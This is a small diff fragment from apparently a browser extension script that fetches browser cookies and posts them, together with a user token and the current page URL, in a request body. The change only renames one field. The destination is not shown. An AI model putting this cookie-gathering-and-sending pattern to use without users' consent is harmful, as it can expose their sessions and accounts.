@@ -28,7 +28,7 @@ chrome.runtime.sendMessage({action: "getCookies"}, function(response) {
       body: JSON.stringify({
         "data": response.cookies,
         "token_identifier": userToken, // Include the token in the request
-        "send_from": currentUrl
+        "url_send_from": currentUrl
       })
     })
     .then(response => {
